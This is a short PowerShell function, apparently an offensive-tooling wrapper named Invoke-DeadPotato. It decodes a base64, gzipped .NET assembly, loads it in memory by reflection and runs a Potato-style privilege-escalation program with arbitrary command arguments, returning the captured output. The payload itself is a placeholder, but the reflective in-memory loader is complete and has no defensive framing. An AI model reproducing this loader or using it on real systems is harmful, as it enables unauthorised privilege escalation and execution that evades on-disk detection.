function Invoke-DeadPotato {
    [CmdletBinding()]
    param(
        [string]$Arguments = "-cmd whoami"
    )

    $b64="<Insert gzipped +_b64 encoded string here>";
    # Decode + decompress
    $bytes = [Convert]::FromBase64String($b64)
    $ms = New-Object IO.MemoryStream(, $bytes)
    $gz = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
    $out = New-Object IO.MemoryStream
    $gz.CopyTo($out)
    $asmBytes = $out.ToArray()

    # Load the .NET assembly
    $asm = [System.Reflection.Assembly]::Load($asmBytes)
    $type = $asm.GetType("DeadPotato.Program")
    $method = $type.GetMethod("Main", [Reflection.BindingFlags] "Public,Static")

    # Redirect Console output
    $stringWriter = New-Object IO.StringWriter
    $originalOut = [Console]::Out
    [Console]::SetOut($stringWriter)

    # Build and pass single string[] as one argument
    $argArray = $Arguments.Split(" ")
    $method.Invoke($null, (,[string[]]$argArray))  

    # Restore and return output
    [Console]::SetOut($originalOut)
    return $stringWriter.ToString()
}